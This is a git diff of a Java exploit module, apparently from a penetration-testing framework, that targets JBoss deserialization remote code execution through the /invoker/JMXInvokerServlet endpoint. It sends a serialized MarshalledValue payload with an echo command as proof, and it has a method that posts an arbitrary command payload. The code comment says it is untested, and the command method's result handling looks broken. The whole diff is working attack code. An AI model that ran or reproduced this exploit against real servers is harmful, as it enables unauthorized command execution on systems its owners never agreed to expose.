@@ -26,7 +26,7 @@ import com.orleven.tentacle.util.WebUtil;
 
 
 /**
- * JBoss Deserialize RCE ,尚未测试
+ * JBoss Deserialize RCE ,尚未测试，路径需要修改
  * @author orleven
  * @date 2017年1月5日
  */
@@ -37,7 +37,6 @@ public class JBossDeserializeRCE  extends WebScriptBase{
 	}
 	
 
-
 	@Override
 	public void prove() {
 		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
@@ -45,7 +44,7 @@ public class JBossDeserializeRCE  extends WebScriptBase{
 		String provePayload = "echo The JBoss Deserialize Remote Code Execution Is Exist!";
 		String result = "";
 		try {
-			result = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getTargetUrl(), getHttpHeaders())).get("Content-Type");
+			result = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getWebUrl()+"/invoker/JMXInvokerServlet", getHttpHeaders())).get("Content-Type");
 			if (result.indexOf("MarshalledValue") >= 0) {
 				getHttpHeaders().put("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");
 				String str = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(),getHttpHeaders(), getCommandPayload(provePayload)));
@@ -74,7 +73,7 @@ public class JBossDeserializeRCE  extends WebScriptBase{
 		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
 		String result = "";
 		try {
-			String str = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(),getHttpHeaders(), getCommandPayload(command)));
+			String str = WebUtil.getResponseBody(WebUtil.httpPost(getWebUrl()+"/invoker/JMXInvokerServlet",getHttpHeaders(), getCommandPayload(command)));
 			if (str!=null) {
 				result = result.substring(result.indexOf("==========")+10);
 			}
